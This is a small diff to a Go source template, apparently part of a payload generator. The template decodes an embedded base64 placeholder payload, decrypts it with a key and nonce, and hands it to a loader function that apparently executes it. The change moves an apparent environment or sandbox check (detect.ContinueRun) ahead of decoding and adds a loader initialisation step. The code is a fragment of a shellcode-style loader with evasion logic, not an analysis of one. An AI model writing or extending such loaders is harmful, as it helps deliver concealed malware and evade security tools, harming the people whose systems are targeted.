@@ -26,17 +26,12 @@ var (
 )
 
 func main() {
-	buf, err := base64.StdEncoding.DecodeString("%s")
-	if err != nil {
-		println(err.Error())
-		return
-	}
+	if !detect.ContinueRun() { return }
+	if loader.Init() != nil { return }
 
-	if !detect.ContinueRun() {
-		return
-	}
-
+	buf, _ := base64.StdEncoding.DecodeString("%s")
 	buf = util.D(buf, key, nonce)
+	
 	loader.X(buf)
 }
 `
